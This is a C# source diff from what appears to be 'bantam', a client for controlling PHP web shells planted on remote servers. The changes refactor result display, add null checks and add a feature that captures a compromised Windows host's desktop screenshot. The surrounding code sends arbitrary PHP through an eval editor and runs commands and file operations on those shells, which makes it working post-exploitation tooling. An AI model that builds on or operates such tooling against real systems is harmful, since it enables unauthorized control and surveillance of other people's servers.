@@ -169,25 +169,26 @@ namespace bantam
         /// <param name="prependText"></param>
         public static async Task ExecutePHPCodeDisplayInRichTextBox(string url, string phpCode, string title, bool encryptResponse, int ResponseEncryptionMode, bool base64DecodeResponse = false, RichTextBox richTextBox = null, string prependText = "")
         {
-            string result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);
+            String result = await ExecutePHPCode(url, phpCode, encryptResponse, ResponseEncryptionMode);
 
-            if (string.IsNullOrEmpty(result) == false) {
+            if (string.IsNullOrEmpty(result)) {
+                result = "No readable data returned from server.";
+            }
 
-                if (base64DecodeResponse) {
-                    result = Helper.DecodeBase64ToString(result);
-                }
+            if (base64DecodeResponse) {
+                result = Helper.DecodeBase64ToString(result);
+            }
 
-                result = result.Replace(PhpBuilder.responseDataRowSeperator, "\r\n");
+            result = result.Replace(PhpBuilder.responseDataRowSeperator, "\r\n");
 
-                if (!string.IsNullOrEmpty(prependText)) {
-                    result = prependText + result + "\r\n";
-                }
+            if (!string.IsNullOrEmpty(prependText)) {
+                result = prependText + result + "\r\n";
+            }
 
-                if (richTextBox != null && richTextBox.IsDisposed == false) {
-                    richTextBox.Text += result;
-                } else {
-                    GuiHelper.RichTextBoxDialog(title, result);
-                }
+            if (richTextBox != null && richTextBox.IsDisposed == false) {
+                richTextBox.Text += result;
+            } else {
+                GuiHelper.RichTextBoxDialog(title, result);
             }
         }
 
@@ -311,19 +312,19 @@ namespace bantam
                 return;
             }
 
-            bool checkBoxChecked = true;
+            bool showResponse = true;
             string shellUrl = SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].ResponseEncryption;
             int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
 
-            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref checkBoxChecked);
+            string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + shellUrl, string.Empty, ref showResponse);
 
             if (string.IsNullOrEmpty(code) == false) {
                 if (encryptResponse) {
                     code = PhpBuilder.phpOb_Start + code + PhpBuilder.phpOb_End;
                 }
 
-                if (checkBoxChecked) {
+                if (showResponse) {
                     ExecutePHPCodeDisplayInRichTextBox(shellUrl, code, "PHP Eval Result - " + shellUrl, encryptResponse, ResponseEncryptionMode);
                 } else {
                     await WebRequestHelper.ExecuteRemotePHP(shellUrl, code);
@@ -353,6 +354,8 @@ namespace bantam
                 if (rtb != null && rtb.IsDisposed == false) {
                     rtb.Text += "Result from (" + shellUrl + ") \r\n" + result + "\r\n\r\n";
                 }
+            } else {
+                rtb.Text += "No result from (" + shellUrl + ") \r\n\r\n";
             }
         }
 
@@ -449,7 +452,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Main Clients/Shells listview selected index changed event
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -574,6 +577,30 @@ namespace bantam
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
+        private async void desktopScreenshotToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (ValidTarget() == false) {
+                return;
+            }
+
+            string shellUrl = SelectedShellUrl;
+            bool encryptResponse = Shells[shellUrl].ResponseEncryption;
+            int ResponseEncryptionMode = Shells[shellUrl].ResponseEncryptionMode;
+
+            string result = await ExecutePHPCode(shellUrl, PhpBuilder.WindowsDesktopScreenShot(), encryptResponse, ResponseEncryptionMode);
+
+            if (string.IsNullOrEmpty(result) == false)
+            {
+                BrowserView broView = new BrowserView(result, 1000, 1000);
+                broView.Show();
+            }
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
         {
             if (ValidTarget() == false) {
@@ -587,7 +614,6 @@ namespace bantam
                 && treeViewFileBrowser.Nodes.Count == 0
                 && Shells[shellUrl].Files.Nodes != null
                 && Shells[shellUrl].Files.Nodes.Count > 0) {
-
                     //populate the treeview from cache
                     GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].Files, treeViewFileBrowser);
                     treeViewFileBrowser.Refresh();
@@ -604,7 +630,7 @@ namespace bantam
         }
 
         /// <summary>
-        /// 
+        /// Saves shell list and settings to current opened XML file
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
@@ -762,6 +788,11 @@ namespace bantam
             }
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void textBoxMaxCommentLength_KeyPress(object sender, KeyPressEventArgs e)
         {
             if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
@@ -856,8 +887,7 @@ namespace bantam
                 string phpCode = PhpBuilder.PhpTestExecutionWithEcho1(encryptResponse);
                 string result = await ExecutePHPCode(shellUrl, phpCode, encryptResponse, ResponseEncryptionMode);
 
-                if (string.IsNullOrEmpty(result))
-                {
+                if (string.IsNullOrEmpty(result)) {
                     return;
                 }
 
@@ -1451,6 +1481,11 @@ namespace bantam
         {
             //Obtain the command sent through the "tag" property of the Item
             ToolStripItem item = (ToolStripItem)sender;
+
+            if (item == null || item.Tag == null) {
+                return;
+            }
+
             string command = (string)item.Tag;
 
             string shellUrl = SelectedShellUrl;
@@ -1495,6 +1530,11 @@ namespace bantam
         {
             //Obtain the filename sent through the "tag" property of the Item
             ToolStripItem item = (ToolStripItem)sender;
+
+            if (item == null || item.Tag == null) {
+                return;
+            }
+
             string file = (string)item.Tag;
 
             string shellUrl = SelectedShellUrl;
